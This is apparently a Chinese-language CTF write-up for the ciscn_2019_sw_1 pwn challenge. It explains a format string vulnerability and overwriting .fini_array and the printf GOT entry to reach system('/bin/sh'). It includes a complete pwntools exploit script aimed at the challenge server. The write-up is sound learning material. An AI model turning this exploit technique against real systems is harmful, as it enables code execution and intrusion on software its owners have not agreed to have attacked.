checksec

![image-20210418215417641](https://static.hack1s.fun/images/2021/04/18/image-20210418215417641.png)

main函数

![image-20210418215502042](https://static.hack1s.fun/images/2021/04/18/image-20210418215502042.png)

直接输入一个格式化字符串，之后printf

程序中有一个`_sys`函数

![image-20210418231215218](https://static.hack1s.fun/images/2021/04/18/image-20210418231215218.png)

但是这个函数的参数command在rodata段，是一个长度为4的空串

这个程序只能执行一次格式化字符串漏洞，之后就会退出

我们如果要使用格式化字符串漏洞劫持控制流的话需要能够触发两次格式化字符串

这就涉及到linux下加载程序时的机制了

![](https://p3.ssl.qhimg.com/t01194430d55d54da9d.png)

加载main函数之前还会运行`.init_array`中的每一个函数指针，在程序退出时运行`.fini_array`中的函数指针

所以一个常见的劫持控制流的方法就是修改`fini_array`中的值

在GDB中可以用`elfheader`看到具体的地址

![image-20210419002504102](https://static.hack1s.fun/images/2021/04/18/image-20210419002504102.png)

之后就是使用格式化字符串往里面写值

每次写两个字节，核心的payload是

```python
payload = p32(fini_array) + p32(fini_array+2) + p32(printf_got) + p32(printf_got+2)
payload += bytes("%" + str(0x8534-0x10) 		+ "c%4$hn" ,encoding='ascii')#0x8534
payload += bytes("%" + str(0x10804-0x8534)  + "c%5$hn" ,encoding='ascii')#0x804
payload += bytes("%" + str(0x183d0-0x10804) + "c%6$hn" ,encoding='ascii')#0x83d0
payload += bytes("%" + str(0x20804-0x183d0) + "c%7$hn" ,encoding='ascii')#0x804
```

这样在`fini_array`处写入了`0x8048534`, 在`printf_got`写入了`0x80483d0`

最终exp

```python
#!/usr/bin/env python

from pwn import *
from LibcSearcher import *

elf = context.binary = ELF('./ciscn_2019_sw_1')
fini_array = 0x804979c
printf_got = elf.got['printf']
main_addr = 0x8048534
system_addr = 0x80483d0

gs = '''
b main
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('node3.buuoj.cn',27541)
    else:
        return process(elf.path)

io = start()
io.recvuntil("name?\n")

payload = p32(fini_array) + p32(fini_array+2) + p32(printf_got) + p32(printf_got+2)
payload += bytes("%" + str(0x8534-0x10) + "c%4$hn"     ,encoding='ascii')#0x8534
payload += bytes("%" + str(0x10804-0x8534) + "c%5$hn"  ,encoding='ascii')#0x804
payload += bytes("%" + str(0x183d0-0x10804) + "c%6$hn" ,encoding='ascii')#0x83d0
payload += bytes("%" + str(0x20804-0x183d0) + "c%7$hn" ,encoding='ascii')#0x804

io.sendline(payload)
io.recvuntil("Hello ")

io.sendline("/bin/sh\x00")

io.interactive()
```

试了一下用fmtstr_payload ,发现做不出来

感觉理解的还不是特别透彻

